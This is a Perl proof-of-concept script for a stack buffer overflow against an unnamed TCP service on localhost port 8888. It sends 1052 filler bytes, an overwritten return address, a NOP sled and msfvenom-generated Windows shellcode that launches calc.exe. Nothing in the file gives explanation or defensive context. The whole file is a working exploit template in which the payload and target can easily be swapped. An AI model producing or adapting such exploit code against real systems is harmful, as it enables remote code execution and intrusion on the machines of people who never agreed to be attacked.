use strict;
use warnings;
use IO::Socket;

my $IP = "127.0.0.1";
my $port = 8888;

# msfvenom -p 'windows/exec' CMD='calc.exe' -f 'perl'
my $shellcode = 
"\xbe\x68\x1b\xc4\x0b\xda\xd9\xd9\x74\x24\xf4\x5f\x31\xc9" .
"\xb1\x30\x31\x77\x13\x03\x77\x13\x83\xc7\x6c\xf9\x31\xf7" .
"\x84\x7f\xb9\x08\x54\xe0\x33\xed\x65\x20\x27\x65\xd5\x90" .
"\x23\x2b\xd9\x5b\x61\xd8\x6a\x29\xae\xef\xdb\x84\x88\xde" .
"\xdc\xb5\xe9\x41\x5e\xc4\x3d\xa2\x5f\x07\x30\xa3\x98\x7a" .
"\xb9\xf1\x71\xf0\x6c\xe6\xf6\x4c\xad\x8d\x44\x40\xb5\x72" .
"\x1c\x63\x94\x24\x17\x3a\x36\xc6\xf4\x36\x7f\xd0\x19\x72" .
"\xc9\x6b\xe9\x08\xc8\xbd\x20\xf0\x67\x80\x8d\x03\x79\xc4" .
"\x29\xfc\x0c\x3c\x4a\x81\x16\xfb\x31\x5d\x92\x18\x91\x16" .
"\x04\xc5\x20\xfa\xd3\x8e\x2e\xb7\x90\xc9\x32\x46\x74\x62" .
"\x4e\xc3\x7b\xa5\xc7\x97\x5f\x61\x8c\x4c\xc1\x30\x68\x22" .
"\xfe\x23\xd3\x9b\x5a\x2f\xf9\xc8\xd6\x72\x97\x0f\x64\x09" .
"\xd5\x10\x76\x12\x49\x79\x47\x99\x06\xfe\x58\x48\x63\xf0" .
"\x12\xd1\xc5\x99\xfa\x83\x54\xc4\xfc\x79\x9a\xf1\x7e\x88" .
"\x62\x06\x9e\xf9\x67\x42\x18\x11\x15\xdb\xcd\x15\x8a\xdc" .
"\xc7\x75\x4d\x4f\x8b\x79";

sub exploit {
    my $offset = 1052;
    my $buffer = "A" x $offset;
    my $eip = pack('V', 0x68F7BCDB); 
    my $nop = "\x90" x 32;
    my $payload = $buffer . $eip . $nop . $shellcode;


    my $sock = IO::Socket::INET->new(
        PeerAddr => $IP,
        PeerPort => $port,
        Proto    => 'tcp'
    ) or die "Could not connect to $IP:$port: $!\n";


    print $sock $payload;
    close($sock);

    print "Payload sent!\n";
}

exploit();
